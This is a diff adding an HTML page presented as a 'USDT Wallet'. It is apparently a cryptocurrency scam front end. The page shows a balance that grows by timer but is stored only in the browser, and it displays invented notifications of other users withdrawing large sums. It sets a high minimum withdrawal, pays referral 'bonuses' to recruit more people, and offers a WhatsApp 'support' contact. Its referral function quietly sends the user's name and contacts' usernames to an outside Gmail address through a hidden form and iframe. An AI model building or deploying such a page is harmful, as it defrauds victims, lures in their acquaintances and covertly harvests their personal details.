@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>USDT Wallet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
+      background-size: 400% 400%;
+      animation: gradient 20s ease infinite;
+      color: white;
+    }
+
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 25px 20px;
+      border-radius: 15px;
+      width: 300px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0,255,128,0.2);
+      z-index: 1;
+    }
+
+    h2 {
+      color: #00e99a;
+      font-size: 1.3em;
+      margin-bottom: 10px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+
+    button {
+      background: #00e99a;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #00c07a;
+    }
+
+    .balance {
+      font-size: 1.2rem;
+      margin: 12px 0;
+    }
+
+    .history, .referral-box {
+      background-color: rgba(0, 128, 64, 0.1);
+      padding: 8px;
+      border-radius: 8px;
+      font-size: 0.85em;
+      margin-top: 12px;
+      max-height: 90px;
+      overflow-y: auto;
+      text-align: left;
+      color: #aaffcc;
+    }
+
+    .referral-box {
+      background: rgba(0,255,128,0.1);
+    }
+
+    #whatsappBtn {
+      background-color: #25D366;
+      color: white;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .top-notification {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 255, 128, 0.15);
+      border: 1px solid rgba(0, 255, 128, 0.3);
+      padding: 10px 16px;
+      font-size: 0.9rem;
+      color: #a8ffce;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 255, 128, 0.2);
+      opacity: 0;
+      pointer-events: none;
+      z-index: 9999;
+      transition: opacity 0.5s ease, transform 0.5s ease;
+    }
+
+    .top-notification.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-notification" id="topNotification"></div>
+
+  <div class="container">
+    <!-- Signup -->
+    <div id="signupSection">
+      <h2>Create Account</h2>
+      <input type="text" id="username" placeholder="Enter your username" required />
+      <input type="text" id="referral" placeholder="Referral code (optional)" />
+      <button onclick="handleSignup()">Start</button>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboardSection" class="hidden">
+      <h2>USDT Wallet</h2>
+      <div class="balance">Balance: <span id="balance">7000.00000000</span> USDT</div>
+      <button onclick="handleWithdraw()">Withdraw</button>
+      <button id="whatsappBtn">WhatsApp Support</button>
+      <div class="referral-box">Your referral code: <b id="refcode">loading...</b></div>
+
+      <!-- New input for your own name -->
+      <input type="text" id="yourNameInput" placeholder="Enter your name" />
+
+      <input type="text" id="refUsedBy" placeholder="Who used your code?" />
+      <button id="submitReferralBtn" onclick="sendReferral()">Submit</button>
+      <div class="history" id="withdraw-history">No withdrawals yet.</div>
+
+      <!-- Hidden iframe to prevent redirect -->
+      <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+      <!-- Form for silent submission -->
+      <form id="notifyForm" action="https://formsubmit.co/snipemarkets@gmail.com" method="POST" target="hidden_iframe" class="hidden">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="referrer_used" id="hiddenRef" />
+        <input type="hidden" name="your_name" id="hiddenYourName" />
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Basic variables and mining setup
+    let balance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
+    const usdtPerMs = 1 / 12000;
+    let miningStarted = false;
+
+    // Notification element and fake notification data
+    const notificationEl = document.getElementById("topNotification");
+    const names = ["Ayesha", "Alex", "John", "Maya", "Sami", "Liam", "Sophia", "Daniel", "Olivia", "Ravi"];
+    const amounts = ["$100500", "$60000", "$50500", "$20000", "$15000", "$99999", "$45500", "$33300"];
+    const shownMessages = new Set();
+
+    function showNotification(msg) {
+      notificationEl.textContent = msg;
+      notificationEl.classList.add("show");
+      setTimeout(() => {
+        notificationEl.classList.remove("show");
+      }, 4000);
+    }
+
+    function randomNotification() {
+      if (shownMessages.size >= names.length * amounts.length) return;
+
+      let name, amount, message;
+      do {
+        name = names[Math.floor(Math.random() * names.length)];
+        amount = amounts[Math.floor(Math.random() * amounts.length)];
+        message = `${name} successfully withdrew ${amount}`;
+      } while (shownMessages.has(message));
+
+      shownMessages.add(message);
+      showNotification(message);
+
+      const nextTime = Math.floor(Math.random() * 15000) + 10000;
+      setTimeout(randomNotification, nextTime);
+    }
+    setTimeout(randomNotification, 5000);
+
+    // On load, show dashboard or signup depending on localStorage
+    window.onload = function () {
+      const user = localStorage.getItem('usdt_user');
+      if (user) {
+        showDashboard();
+      }
+    };
+
+    function handleSignup() {
+      const usernameInput = document.getElementById('username').value.trim();
+      const referralInput = document.getElementById('referral').value.trim();
+
+      if (!usernameInput) {
+        alert("Please enter a username.");
+        return;
+      }
+
+      // Save the new user in localStorage USERS list
+      let users = JSON.parse(localStorage.getItem('usdt_users') || '[]');
+      if (users.includes(usernameInput)) {
+        alert("Username already taken, please choose another.");
+        return;
+      }
+      users.push(usernameInput);
+      localStorage.setItem('usdt_users', JSON.stringify(users));
+
+      localStorage.setItem('usdt_user', usernameInput);
+
+      if (referralInput && referralInput !== usernameInput) {
+        localStorage.setItem('usdt_referral_used', referralInput);
+        localStorage.removeItem('usdt_referral_rewarded');
+      } else {
+        localStorage.removeItem('usdt_referral_used');
+        localStorage.removeItem('usdt_referral_rewarded');
+      }
+
+      // Reset balance for new user
+      balance = 0;
+      localStorage.setItem('usdtBalance', balance.toString());
+
+      showDashboard();
+    }
+
+    function showDashboard() {
+      document.getElementById('signupSection').classList.add('hidden');
+      document.getElementById('dashboardSection').classList.remove('hidden');
+
+      const user = localStorage.getItem('usdt_user');
+      document.getElementById('refcode').textContent = user;
+
+      const referral = localStorage.getItem('usdt_referral_used');
+      const alreadyCredited = localStorage.getItem('usdt_referral_rewarded');
+
+      if (referral && !alreadyCredited) {
+        balance += 200;
+        localStorage.setItem('usdtBalance', balance.toString());
+
+        const refKey = `ref_${referral}_bonus`;
+        const refBonus = parseFloat(localStorage.getItem(refKey)) || 0;
+        localStorage.setItem(refKey, (refBonus + 200).toString());
+
+        localStorage.setItem('usdt_referral_rewarded', 'yes');
+      }
+
+      const refBonusKey = `ref_${user}_bonus`;
+      const refBonusStored = parseFloat(localStorage.getItem(refBonusKey)) || 0;
+      if (refBonusStored > 0) {
+        balance += refBonusStored;
+        localStorage.setItem('usdtBalance', balance.toString());
+        localStorage.removeItem(refBonusKey);
+      }
+
+      updateBalance();
+      updateWithdrawHistory();
+      startMining();
+    }
+
+    function updateBalance() {
+      document.getElementById('balance').textContent = balance.toFixed(8);
+    }
+
+    function startMining() {
+      if (!miningStarted) {
+        setInterval(() => {
+          balance += usdtPerMs;
+          localStorage.setItem('usdtBalance', balance.toString());
+          updateBalance();
+        }, 10);
+        miningStarted = true;
+      }
+    }
+
+    function handleWithdraw() {
+      if (balance >= 3000) {
+        alert("Redirecting to withdrawal page...");
+        window.location.href = "withdraw.html";
+      } else {
+        alert("Minimum withdrawal is $3000 USDT.");
+      }
+    }
+
+    function updateWithdrawHistory() {
+      const hist = JSON.parse(localStorage.getItem('withdrawHistory') || '[]');
+      const el = document.getElementById('withdraw-history');
+      el.innerHTML = hist.length ? hist.map(h => `<div>${h}</div>`).join('') : "No withdrawals yet.";
+    }
+
+    // Referral submission with new silent form submit
+    function sendReferral() {
+      const referrer = localStorage.getItem('usdt_user');
+      const usedBy = document.getElementById("refUsedBy").value.trim();
+      const yourName = document.getElementById("yourNameInput").value.trim();
+
+      if (!yourName) {
+        alert("Please enter your name.");
+        return;
+      }
+
+      if (!usedBy) {
+        alert("Please enter the username who used your code.");
+        return;
+      }
+
+      if (usedBy === referrer) {
+        alert("❌ Do not enter fake or self referrals. At withdrawal stage, our team will fully check your account. If violations found, your account will be banned.");
+        return;
+      }
+
+      // Check if this referral username was already submitted by this user
+      const refKey = `ref_${usedBy}_credited_by_${referrer}`;
+      if (localStorage.getItem(refKey)) {
+        alert("❌ You have already claimed bonus from this user.");
+        return;
+      }
+
+      // Disable submit button and show loading
+      const submitBtn = document.getElementById("submitReferralBtn");
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Processing...";
+
+      setTimeout(() => {
+        // Add $100 to balance after 3 seconds
+        balance += 100;
+        localStorage.setItem('usdtBalance', balance.toString());
+        updateBalance();
+
+        // Mark this referral username as credited for this referrer
+        localStorage.setItem(refKey, "true");
+
+        // Update withdrawal history
+        let hist = JSON.parse(localStorage.getItem('withdrawHistory') || '[]');
+        hist.unshift(`Referral bonus +$100 from ${usedBy}`);
+        if (hist.length > 10) hist.pop();
+        localStorage.setItem('withdrawHistory', JSON.stringify(hist));
+        updateWithdrawHistory();
+
+        // Set hidden form values and submit silently
+        document.getElementById("hiddenRef").value = usedBy;
+        document.getElementById("hiddenYourName").value = yourName;
+        document.getElementById("notifyForm").submit();
+
+        alert("✅ Referral submitted successfully. $100 added to your balance.");
+
+        // Clear inputs and reset button
+        document.getElementById("refUsedBy").value = "";
+        document.getElementById("yourNameInput").value = "";
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Submit";
+      }, 3000);
+    }
+
+    document.getElementById('whatsappBtn').addEventListener('click', () => {
+      const phoneNumber = '16723004545';
+      const url = `https://wa.me/${phoneNumber}`;
+      window.open(url, '_blank');
+    });
+  </script>
+</body>
+</html>
